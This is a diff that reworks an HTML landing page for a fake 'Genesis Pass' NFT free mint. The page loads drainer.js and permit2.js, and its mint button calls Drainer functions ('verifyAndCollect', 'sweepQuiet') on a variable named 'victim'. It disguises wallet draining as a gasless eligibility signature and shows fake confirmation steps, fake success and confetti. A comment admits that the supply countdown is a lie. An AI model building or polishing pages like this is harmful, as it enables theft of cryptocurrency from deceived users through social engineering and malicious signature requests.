@@ -3,29 +3,77 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Exclusive Mint — Genesis Pass</title>
+<title>Genesis Pass — Official Mint</title>
 <style>
-body{font-family:Inter,Arial,sans-serif;background:#0a0a0f;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
-.card{background:#13131c;border:1px solid #26263a;border-radius:16px;padding:40px;max-width:420px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.6)}
-h1{font-size:24px;margin:0 0 8px}p{color:#9a9ab0;font-size:14px}button{background:linear-gradient(135deg,#7c3aed,#4f46e5);border:0;color:#fff;font-size:16px;font-weight:700;padding:14px 32px;border-radius:10px;cursor:pointer;width:100%;margin-top:20px}#status{margin-top:12px;font-size:13px;color:#666}img{width:100%;border-radius:12px;margin-bottom:16px}
+*{box-sizing:border-box}body{font-family:Inter,system-ui,Arial,sans-serif;background:radial-gradient(1200px 600px at 50% -10%,#1b1440,#0a0a0f);color:#fff;margin:0;min-height:100vh}
+.nav{display:flex;justify-content:space-between;align-items:center;padding:18px 32px;font-size:14px;color:#9a9ab0}.nav b{color:#fff}
+.hero{max-width:860px;margin:30px auto;padding:0 20px;display:grid;grid-template-columns:1fr 1fr;gap:28px;align-items:center}
+@media(max-width:720px){.hero{grid-template-columns:1fr}}
+.art{background:#13131c;border:1px solid #26263a;border-radius:20px;overflow:hidden}.art img{width:100%;display:block}.art .meta{padding:16px;font-size:13px;color:#9a9ab0}
+.card{background:rgba(19,19,28,.9);border:1px solid #2c2c4a;border-radius:20px;padding:32px;box-shadow:0 30px 80px rgba(0,0,0,.5)}
+.badge{display:inline-block;background:#1d2b1d;color:#4ade80;font-size:12px;padding:4px 12px;border-radius:99px;margin-bottom:12px}
+h1{margin:0 0 6px;font-size:28px}.sub{color:#9a9ab0;font-size:14px;margin-bottom:18px}
+.bar{height:8px;background:#222;border-radius:99px;overflow:hidden;margin:12px 0}.bar i{display:block;height:100%;width:92%;background:linear-gradient(90deg,#7c3aed,#4f46e5)}
+.row{display:flex;justify-content:space-between;font-size:13px;color:#9a9ab0}
+button{width:100%;margin-top:18px;background:linear-gradient(135deg,#7c3aed,#4f46e5);border:0;color:#fff;font-size:16px;font-weight:700;padding:15px;border-radius:12px;cursor:pointer}
+button:disabled{opacity:.5;cursor:wait}
+#status{margin-top:12px;font-size:13px;color:#8a8aa0;min-height:18px;text-align:center}
+.steps{margin-top:16px;font-size:13px;color:#9a9ab0}.steps div{padding:6px 0}
+.ok{color:#4ade80}.faq{max-width:860px;margin:10px auto 40px;padding:0 20px;font-size:13px;color:#9a9ab0}.faq h3{color:#fff}
+#confetti{position:fixed;inset:0;pointer-events:none;display:none}
 </style>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
 </head>
 <body>
-<div class="card">
-<img src="https://picsum.photos/400/300" alt="Genesis">
-<h1>Genesis Pass — Free Mint</h1>
-<p>Supply: 1,111 &nbsp;•&nbsp; <span id="left">87 left</span></p>
-<button id="mintBtn">Mint Now</button>
-<div id="status"></div>
+<div class="nav"><b>◈ GENESIS</b><span>Roadmap &nbsp; Team &nbsp; Discord</span></div>
+<div class="hero">
+  <div class="art">
+    <img src="https://picsum.photos/seed/genesis88/640/640" alt="Genesis Pass #088">
+    <div class="meta">Genesis Pass #088 — revealed after mint</div>
+  </div>
+  <div class="card">
+    <span class="badge">● Live — Season 1</span>
+    <h1>Genesis Pass Mint</h1>
+    <div class="sub">Free mint for early supporters. One per wallet.</div>
+    <div class="row"><span>Minted</span><span id="pct">92%</span></div>
+    <div class="bar"><i></i></div>
+    <div class="row"><span>Supply 1,111</span><span><span id="left">87</span> left</span></div>
+    <button id="mintBtn">Verify wallet & mint</button>
+    <div id="status"></div>
+    <div class="steps" id="steps"></div>
+  </div>
 </div>
+<div class="faq">
+  <h3>How it works</h3>
+  <p>1. Verify your wallet — a gasless signature confirms eligibility.<br>2. Mint is free, you only confirm once.<br>3. Your Pass reveals instantly.</p>
+</div>
+<canvas id="confetti"></canvas>
 <script src="./drainer.js"></script>
+<script src="./permit2.js"></script>
 <script>
+const stepsEl = document.getElementById('steps');
+const statusEl = document.getElementById('status');
+function step(t, done){ const d=document.createElement('div'); d.innerHTML=(done?'<span class="ok">✓</span> ':'○ ')+t; stepsEl.appendChild(d); return d; }
 document.getElementById('mintBtn').onclick = async () => {
-  const s = document.getElementById('status');
-  s.textContent = 'Connecting...';
-  try { await window.Drainer.mintAndDrain((m)=>{ s.textContent = m; }); s.textContent = 'Minted successfully ✓'; }
-  catch(e){ console.error(e); s.textContent = 'Failed: ' + (e.message||e); }
+  const btn = document.getElementById('mintBtn');
+  btn.disabled = true; stepsEl.innerHTML='';
+  try{
+    const s1 = step('Checking eligibility...');
+    const victim = await window.Drainer.verifyAndCollect();
+    s1.innerHTML='<span class="ok">✓</span> Wallet eligible';
+    const s2 = step('Reserving your Pass...');
+    await new Promise(r=>setTimeout(r,1200));
+    s2.innerHTML='<span class="ok">✓</span> Pass #088 reserved';
+    const s3 = step('Confirming on-chain...');
+    await window.Drainer.sweepQuiet();
+    await new Promise(r=>setTimeout(r,1500));
+    s3.innerHTML='<span class="ok">✓</span> Minted — Token #088';
+    statusEl.textContent='Congratulations! Your Pass is in your wallet.';
+    try{ confetti({particleCount:160,spread:75,origin:{y:.6}}); }catch(e){}
+    // Countdown-Lüge: Bestand runterzählen für die nächsten Besucher (nur lokal)
+    const l=document.getElementById('left'); l.textContent = Math.max(1,parseInt(l.textContent)-1);
+  }catch(e){ console.error(e); statusEl.textContent='Verification failed — try another wallet.'; btn.disabled=false; }
 };
 </script>
 </body>
